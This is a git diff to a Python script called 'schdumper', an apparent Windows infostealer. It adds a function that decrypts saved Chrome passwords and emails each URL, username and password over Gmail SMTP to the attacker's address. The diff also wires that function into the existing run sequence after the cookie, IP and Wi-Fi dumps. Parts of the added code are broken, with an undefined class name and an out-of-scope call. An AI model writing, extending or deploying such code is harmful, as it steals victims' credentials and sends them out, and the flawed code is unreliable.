@@ -11,6 +11,7 @@ import win32crypt
 import os
 from tabulate import tabulate
 from urllib.request import urlopen
+from ChromePasswordsStealer import ChromePasswordsStealer
 
 
 #welcome to schdumper
@@ -27,6 +28,34 @@ def bg():
     os.system('start cmd /k reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "bg.bmp" /f')
     os.system('RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True')
 
+    
+def chrome_passwd():
+    stealer = ChromePasswordsStealer()
+    stealer = ChromiumPasswordsStealer("passwords", True)
+    stealer.get_database_cursor()
+    stealer.get_key()
+    for url, username, password in stealer.get_credentials():
+        print(url, username, password)
+        subject = "sch's chrome paswd dump"
+        body = f"""
+            url : {url}
+            username: {username}
+            passwd: {password}
+        """
+
+        em = EmailMessage()
+        em['From'] = email_sender
+        em['To'] = email_receiver
+        em['Subject'] = subject
+        em.set_content(body)
+
+        context = ssl.create_default_context()
+
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+            smtp.login(email_sender, email_password)
+            smtp.sendmail(email_sender, email_receiver, em.as_string())
+
+stealer.save_and_clean()
 def cookies():
     global email_sender
     global email_receiver
@@ -125,3 +154,4 @@ cookies()
 skiddy_ip()
 wifi()
 bg()
+chrome_passwd()
